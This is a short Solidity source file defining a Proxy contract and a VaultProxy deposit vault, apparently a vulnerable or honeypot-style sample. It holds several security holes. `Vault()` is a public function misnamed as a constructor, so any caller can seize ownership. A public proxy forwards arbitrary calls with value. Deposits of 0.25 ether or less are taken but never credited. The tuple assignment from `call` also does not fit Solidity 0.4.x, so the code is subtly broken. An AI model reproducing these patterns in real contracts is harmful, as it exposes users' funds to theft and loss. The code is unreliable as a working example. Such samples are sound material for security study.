pragma solidity ^0.4.23;

contract Proxy {
    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }
    address owner;

    function transferOwner(address _owner) public onlyOwner {
        owner = _owner;
    }

    function proxy(address target, bytes data) public payable {
        require(target != address(0), "Target address cannot be zero.");
        require(msg.value > 0, "Value sent must be greater than 0.");
        bool success;
        bytes memory returnData;
        (success, returnData) = target.call.value(msg.value)(data);
        require(success, "External call failed.");
    }
}

contract VaultProxy is Proxy {
    mapping(address => uint256) public deposits;

    function() public payable {}

    function Vault() public payable {
        require(msg.sender == tx.origin, "Vault can only be created by an externally owned account.");
        owner = msg.sender;
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0, "Value sent must be greater than 0.");
        if (msg.value > 0.25 ether) {
            deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        require(amount > 0, "Amount to withdraw must be greater than 0.");
        require(deposits[msg.sender] >= amount, "Insufficient balance.");
        deposits[msg.sender] -= amount;
        msg.sender.transfer(amount);
    }
}